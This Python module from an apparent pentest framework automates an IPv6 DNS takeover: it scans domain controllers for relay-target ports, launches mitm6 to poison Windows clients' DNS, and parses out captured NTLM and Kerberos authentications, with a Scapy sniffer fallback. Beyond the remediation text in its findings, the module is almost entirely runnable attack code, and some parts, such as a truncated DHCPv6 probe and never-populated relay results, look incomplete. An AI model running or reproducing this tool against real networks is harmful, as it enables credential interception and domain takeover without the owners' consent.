"""
Expedite Strike — IPv6 DNS Takeover Engine
===========================================
For authorized penetration testing only.
Implements mitm6-style IPv6 DHCPv6/DNS spoofing to capture auth
from Windows clients that prefer IPv6 DNS over IPv4.

MITRE ATT&CK:
  T1557     — Adversary-in-the-Middle
  T1557.003 — DHCP Spoofing
  T1040     — Network Sniffing
"""

import os
import re
import socket
import struct
import subprocess
import threading
import time
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None

MITRE = [
    {"id": "T1557",     "name": "Adversary-in-the-Middle"},
    {"id": "T1557.003", "name": "DHCP Spoofing"},
    {"id": "T1040",     "name": "Network Sniffing"},
]

DHCPV6_PORT    = 547   # Server port
DHCPV6_CLI_PORT = 546  # Client port
DHCPV6_MCAST   = "ff02::1:2"


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


# ── IPv6 Exposure Detection ────────────────────────────────────────────────────

def check_ipv6_exposure(network: str, log_fn: Callable = None) -> Dict:
    """
    Scan for IPv6-enabled hosts and DHCPv6 exposure.

    Args:
        network:  IPv4 CIDR or DC IP to probe (e.g. '192.168.1.0/24')
        log_fn:   Logging callback

    Returns:
        {ipv6_hosts, dhcpv6_present, vulnerable, findings}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"  [IPv6] Checking IPv6 exposure on {network}...")
    findings = []
    ipv6_hosts = []
    dhcpv6_present = False

    # Check if DHCPv6 port is reachable (UDP 547)
    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.settimeout(2)
        # Send minimal DHCPv6 solicit probe
        dhcpv6_solicit = (
            b"\x01"           # msg-type: SOLICIT
            b"\x00\x00\x01"   # transaction-id
        )
        sock.sendto(dhcpv6_solicit, (DHCPV6_MCAST, DHCPV6_PORT))
        try:
            data, addr = sock.recvfrom(1024)
            if data:
                dhcpv6_present = True
                _log(f"  [IPv6] ⚠ DHCPv6 server detected at {addr[0]}")
        except socket.timeout:
            pass
        sock.close()
    except Exception:
        pass

    # Check target IP for IPv6 AAAA DNS records
    target_ip = network.split("/")[0] if "/" in network else network
    try:
        # Try to get IPv6 info about the host
        results = socket.getaddrinfo(target_ip, None, socket.AF_INET6)
        for r in results:
            if r[4][0] and not r[4][0].startswith("::"):
                ipv6_hosts.append(r[4][0])
                _log(f"  [IPv6] Host {target_ip} has IPv6: {r[4][0]}")
    except Exception:
        pass

    # Check if target has port 389 (LDAP) accessible — relay target
    try:
        s = socket.create_connection((target_ip, 389), timeout=3)
        s.close()
        _log(f"  [IPv6] ✅ LDAP (389) open on {target_ip} — valid relay target")
        findings.append({
            "title":       "IPv6 Attack Surface — LDAP Relay Target",
            "severity":    "High",
            "description": (
                f"Host {target_ip} has LDAP exposed and may be vulnerable to "
                f"IPv6 DNS takeover + NTLM relay to LDAP. Attackers can use mitm6 "
                f"to poison DNS for Windows clients, forcing authentication to this host."
            ),
            "target":      target_ip,
            "mitre_id":    "T1557.003",
            "mitre_name":  "DHCP Spoofing",
            "remediation": (
                "Disable IPv6 if not in use via GPO. Block DHCPv6 on network switches. "
                "Enable LDAP signing and channel binding. Disable WPAD."
            ),
        })
    except Exception:
        pass

    vulnerable = bool(ipv6_hosts or dhcpv6_present or findings)

    if not findings and not ipv6_hosts:
        _log("  [IPv6] No significant IPv6 exposure detected")

    return {
        "ipv6_hosts":      ipv6_hosts,
        "dhcpv6_present":  dhcpv6_present,
        "vulnerable":      vulnerable,
        "findings":        findings,
    }


def detect_ipv6_misconfiguration(dc_ip: str, log_fn: Callable = None) -> List[Dict]:
    """
    Check if DC responds to IPv6 and has attack-relevant services open.

    Args:
        dc_ip:   Domain Controller IP
        log_fn:  Logging callback

    Returns:
        List of findings
    """
    global _log_fn
    _log_fn = log_fn

    findings = []
    _log(f"  [IPv6] Checking IPv6 misconfiguration on DC {dc_ip}...")

    # Ports to check (AD services that could be relay targets)
    relay_ports = {
        389:  "LDAP",
        636:  "LDAPS",
        3268: "Global Catalog",
        5985: "WinRM HTTP",
        5986: "WinRM HTTPS",
    }

    open_ports = []
    for port, name in relay_ports.items():
        try:
            s = socket.create_connection((dc_ip, port), timeout=3)
            s.close()
            open_ports.append((port, name))
            _log(f"  [IPv6] {name} ({port}) open on {dc_ip}")
        except Exception:
            pass

    if open_ports:
        port_str = ", ".join(f"{n}({p})" for p, n in open_ports)
        findings.append({
            "title":       f"IPv6 Relay Attack Surface — {dc_ip}",
            "severity":    "High",
            "description": (
                f"Domain controller {dc_ip} has {port_str} accessible. "
                f"Combined with IPv6 enabled on client workstations, an attacker "
                f"can use mitm6/DHCPv6 spoofing to force authentication to these ports. "
                f"RBCD or ACL abuse may achieve Domain Admin."
            ),
            "target":      dc_ip,
            "mitre_id":    "T1557",
            "mitre_name":  "Adversary-in-the-Middle",
            "remediation": (
                "Disable IPv6 if unused. Enable LDAP signing + channel binding. "
                "Set 'Require NTLMv2 session security' in security policy. "
                "Disable WPAD in DNS and via GPO."
            ),
        })

    return findings


# ── mitm6 Subprocess Wrapper ───────────────────────────────────────────────────

def run_mitm6_subprocess(
    interface: str,
    domain: str,
    log_fn: Callable = None,
    duration: int = 120,
) -> Dict:
    """
    Run mitm6 if installed, parse output for captured authentications.
    Falls back to Scapy-based implementation if mitm6 not found.

    Args:
        interface:  Network interface (e.g. 'eth0', 'Ethernet')
        domain:     Target AD domain (e.g. 'corp.local')
        log_fn:     Logging callback
        duration:   Seconds to run

    Returns:
        {clients_poisoned, auth_captured, ldap_relay_results, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    clients_poisoned = []
    auth_captured    = []
    findings         = []

    _log(f"  [IPv6] Attempting mitm6 on interface '{interface}' for domain '{domain}'...")

    # Try real mitm6
    cmd = ["mitm6", "-d", domain, "-i", interface, "--no-ra"]
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        proc  = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=flags,
        )

        start = time.time()
        while time.time() - start < duration:
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
                continue
            line = line.strip()
            if line:
                _log(f"  [IPv6/mitm6] {line}")

            # Parse poisoned clients
            m = re.search(r"Sending DHCPv6.*to\s+([\d\.]+)", line, re.I)
            if m:
                clients_poisoned.append(m.group(1))

            # Parse captured auth
            m2 = re.search(r"(NTLM|Kerberos).*from\s+([\d\.]+)", line, re.I)
            if m2:
                auth_captured.append({
                    "type": m2.group(1),
                    "from": m2.group(2),
                })
                _log(f"  [IPv6] 🎯 Auth captured: {m2.group(1)} from {m2.group(2)}")

        if proc.poll() is None:
            proc.terminate()

    except FileNotFoundError:
        _log("  [IPv6] mitm6 not installed — running pure-Python DHCPv6 detection")
        return _run_scapy_ipv6_probe(interface, domain, log_fn, duration)
    except Exception as e:
        _log(f"  [IPv6] mitm6 error: {e}")

    if clients_poisoned:
        findings.append({
            "title":       f"IPv6 DNS Takeover — {len(clients_poisoned)} Client(s) Poisoned",
            "severity":    "Critical",
            "description": (
                f"mitm6 successfully poisoned {len(clients_poisoned)} Windows client(s): "
                f"{', '.join(set(clients_poisoned))}. "
                f"Clients are sending DNS queries to attacker. "
                f"Captured {len(auth_captured)} authentication(s) for relay."
            ),
            "target":      ", ".join(set(clients_poisoned)),
            "mitre_id":    "T1557.003",
            "mitre_name":  "DHCP Spoofing",
            "remediation": (
                "Disable IPv6 or deploy IPv6 security (RA Guard, DHCPv6 snooping). "
                "Enable LDAP signing and channel binding."
            ),
        })

    return {
        "clients_poisoned":    list(set(clients_poisoned)),
        "auth_captured":       auth_captured,
        "ldap_relay_results":  [],
        "findings":            findings,
        "mitre":               MITRE,
        "summary":             (
            f"mitm6: {len(clients_poisoned)} clients poisoned, "
            f"{len(auth_captured)} auth(s) captured"
        ),
    }


def _run_scapy_ipv6_probe(
    interface: str, domain: str, log_fn: Callable, duration: int
) -> Dict:
    """
    Pure-Python Scapy-based IPv6 probe (fallback when mitm6 not installed).
    Listens for DHCPv6 Solicit messages to identify vulnerable clients.
    """
    global _log_fn
    _log_fn = log_fn

    clients = []
    findings = []

    _log("  [IPv6] Pure-Python Scapy IPv6 probe starting...")

    try:
        from scapy.all import sniff, DHCP6_Solicit, IPv6
        stop_flag = threading.Event()

        def _pkt_handler(pkt):
            if DHCP6_Solicit in pkt and IPv6 in pkt:
                src = pkt[IPv6].src
                if src not in clients:
                    clients.append(src)
                    _log(f"  [IPv6] DHCPv6 Solicit from {src} — client is IPv6 enabled!")

        t = threading.Thread(
            target=lambda: sniff(
                iface=interface or None,
                filter="udp and dst port 547",
                prn=_pkt_handler,
                timeout=duration,
                store=False,
            ),
            daemon=True,
        )
        t.start()
        t.join(timeout=duration + 2)

    except ImportError:
        _log("  [IPv6] Scapy not installed — install with: pip install scapy")
        return {
            "clients_poisoned": [], "auth_captured": [],
            "ldap_relay_results": [], "findings": [], "mitre": MITRE,
            "summary": "mitm6 and Scapy not available — manual mitm6 install recommended",
        }
    except Exception as e:
        _log(f"  [IPv6] Scapy probe error: {e}")

    if clients:
        findings.append({
            "title":       f"IPv6 DHCPv6 Solicit Detected — {len(clients)} Client(s)",
            "severity":    "High",
            "description": (
                f"{len(clients)} Windows client(s) are sending DHCPv6 Solicit messages: "
                f"{', '.join(clients)}. These are vulnerable to mitm6 DNS takeover. "
                f"Install mitm6 to exploit: pip install mitm6"
            ),
            "target":      ", ".join(clients),
            "mitre_id":    "T1557.003",
            "mitre_name":  "DHCP Spoofing",
            "remediation": "Disable IPv6 on all workstations if not actively used.",
        })

    return {
        "clients_poisoned":   clients,
        "auth_captured":      [],
        "ldap_relay_results": [],
        "findings":           findings,
        "mitre":              MITRE,
        "summary":            f"Scapy probe: {len(clients)} IPv6-enabled client(s) detected",
    }


# ── Top-Level API ──────────────────────────────────────────────────────────────

def run_ipv6_dns_takeover(
    interface: str = "",
    domain: str = "",
    relay_to: str = "",
    log_fn: Callable = None,
    duration: int = 120,
) -> Dict:
    """
    Full IPv6 DNS takeover attack chain.

    Args:
        interface:  Network interface name
        domain:     AD domain to target (e.g. 'corp.local')
        relay_to:   IP to relay captured auth to (DC IP)
        log_fn:     Logging callback
        duration:   Duration in seconds

    Returns:
        {clients_poisoned, auth_captured, ldap_relay_results, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [IPv6] IPv6 DNS Takeover (mitm6-style)")
    _log(f"  [IPv6] Domain    : {domain}")
    _log(f"  [IPv6] Interface : {interface or 'auto'}")
    _log(f"  [IPv6] Relay To  : {relay_to or 'N/A'}")
    _log(f"  [IPv6] Duration  : {duration}s")
    _log(f"{'='*60}\n")

    # Run exposure check first
    exposure = check_ipv6_exposure(relay_to or "127.0.0.1", log_fn)

    # Run mitm6 / Scapy
    result = run_mitm6_subprocess(interface, domain, log_fn, duration)

    # Merge exposure findings
    result["findings"] = exposure["findings"] + result["findings"]
    result["ipv6_hosts"] = exposure["ipv6_hosts"]
    result["dhcpv6_present"] = exposure["dhcpv6_present"]

    return result
